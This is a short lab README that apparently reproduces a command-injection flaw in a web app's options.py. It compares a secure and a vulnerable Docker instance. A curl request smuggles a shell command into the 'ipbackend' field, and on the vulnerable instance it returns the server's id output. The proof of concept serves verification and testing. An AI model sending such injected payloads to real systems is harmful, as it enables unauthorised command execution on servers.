# secure instance
```bash
docker compose -f docker-compose-safe.yml up -d 
```
Execute `curl -X POST "https://localhost/app/options.py" --data "alert_consumer=1&ipbackend=\";id+#" --insecure` command and you will receive a http redirect response like `<title>Redirecting...</title>`

# vulnerable instance
```bash
docker compose -f docker-compose.yml up -d 
```
Execute `curl -X POST "https://localhost/app/options.py" --data "alert_consumer=1&ipbackend=\";id+#" --insecure` command and you will receive a similar response like `uid=48(apache) gid=48(apache) groups=48(apache)<br>`